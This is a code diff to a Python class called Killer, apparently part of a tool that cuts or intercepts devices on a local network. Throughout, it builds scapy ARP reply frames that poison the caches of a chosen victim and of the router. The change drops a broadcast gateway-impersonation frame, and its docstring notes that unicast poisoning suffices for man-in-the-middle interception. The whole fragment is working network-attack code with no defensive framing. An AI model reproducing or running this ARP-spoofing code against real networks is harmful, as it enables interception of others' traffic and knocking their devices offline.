@@ -464,16 +464,15 @@ class Killer:
         seq = int(self._op_seq.get(mac, 0))
         self._poison_arp_now(victim, seq, repeats=max(1, int(repeats)), delay_s=0)
 
-    def _iface_is_wireless(self) -> bool:
-        try:
-            from tools.mitm_probe import iface_is_wireless
-
-            return iface_is_wireless(self.iface)
-        except Exception:
-            return False
-
     def _poison_frames(self, victim):
-        """Unicast ARP poison; on Wi‑Fi also broadcast router-impersonation to reach wired clients."""
+        """Unicast ARP poison only (victim + router).
+
+        Do **not** broadcast gateway impersonation on Wi‑Fi. A ff:ff:ff ARP with
+        ``psrc=router`` teaches every listening Wi‑Fi client that this PC is the
+        gateway — phones/laptops lose internet while a wired PS5 may stay up
+        (common PC‑Wi‑Fi + console‑Ethernet layouts, including modem+router).
+        Unicast to the victim/router MACs is enough for MITM when L2 allows it.
+        """
         to_victim = Ether(dst=victim['mac']) / ARP(
             op=2,
             psrc=self.router['ip'],
@@ -488,19 +487,7 @@ class Killer:
             pdst=self.router['ip'],
             hwdst=self.router['mac'],
         )
-        frames = [to_victim, to_router]
-        if self._iface_is_wireless():
-            frames.append(
-                Ether(dst='ff:ff:ff:ff:ff:ff')
-                / ARP(
-                    op=2,
-                    psrc=self.router['ip'],
-                    hwsrc=self.iface.mac,
-                    pdst=victim['ip'],
-                    hwdst=victim['mac'],
-                )
-            )
-        return frames
+        return [to_victim, to_router]
 
     def _poison_arp_now(self, victim, seq=0, repeats=1, delay_s=0.0):
         """Best-effort immediate ARP poison burst; aborts if a newer op supersedes this sequence.
